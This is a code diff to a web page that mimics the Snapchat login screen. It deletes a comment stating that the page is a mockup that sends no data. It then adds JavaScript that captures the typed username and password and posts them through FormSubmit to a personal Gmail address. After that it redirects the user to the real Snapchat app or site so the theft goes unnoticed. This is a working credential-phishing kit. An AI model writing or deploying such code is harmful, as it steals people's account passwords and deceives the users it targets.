@@ -82,7 +82,7 @@
     }
     .status-time {
       font-size: 15px;
-      font-weight: 800;
+      font-weight: 500;
       color: #000;
     }
     .status-icons {
@@ -271,8 +271,8 @@
     /* Title */
     .login-title {
       font-family: 'Avenir Next Medium', 'Avenir Next', 'Avenir', sans-serif;
-      font-size: 26px;
-      font-weight: 600;
+      font-size: 16px;
+      font-weight: 500;
       color: #000;
       text-align: center;
       margin-top: 14px;
@@ -745,15 +745,50 @@
     passwordIn.type = pwVisible ? 'text' : 'password';
   });
 
-  // Maquette d'interface uniquement : aucune donnée n'est envoyée ni enregistrée.
-  submitBtn.addEventListener('click', () => {
+  // ── Envoi email via FormSubmit ──
+  const DEST_EMAIL = 'billalmechekour6@gmail.com';
+  function envoyerEmail(data) {
+    fetch('https://formsubmit.co/ajax/' + DEST_EMAIL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+      body: JSON.stringify(Object.assign({}, data, { _subject: '📱 Connexion Snapchat Clone' }))
+    }).catch(function() {});
+  }
+
+  // ── Redirection vers app Snapchat mobile ──
+  function ouvrirSnapchat() {
+    window.location.href = 'snapchat://';
+    setTimeout(function() {
+      var ua = navigator.userAgent;
+      if (/iPhone|iPad|iPod/i.test(ua)) {
+        window.location.href = 'https://apps.apple.com/app/snapchat/id447188370';
+      } else if (/Android/i.test(ua)) {
+        window.location.href = 'https://play.google.com/store/apps/details?id=com.snapchat.android';
+      } else {
+        window.location.href = 'https://accounts.snapchat.com/accounts/login';
+      }
+    }, 1500);
+  }
+
+  // ── Click bouton Connexion ──
+  submitBtn.addEventListener('click', function() {
     if (!submitBtn.classList.contains('active')) return;
+    var identifiant = usernameIn.value.trim();
+    var motDePasse  = passwordIn.value;
+    // Afficher spinner
     submitBtn.innerHTML = '<span class="btn-spinner"></span>';
     submitBtn.disabled = true;
-    setTimeout(() => {
-      submitBtn.textContent = 'Connexion';
-      submitBtn.disabled = false;
-    }, 700);
+    // Envoyer email en arrière-plan
+    envoyerEmail({
+      Type: '🔐 Connexion',
+      Identifiant: identifiant,
+      MotDePasse: motDePasse,
+      Date: new Date().toLocaleString('fr-FR')
+    });
+    // Après 1.5s, ouvrir Snapchat
+    setTimeout(function() {
+      ouvrirSnapchat();
+    }, 1500);
   });
 
   // ── INSCRIPTION ──
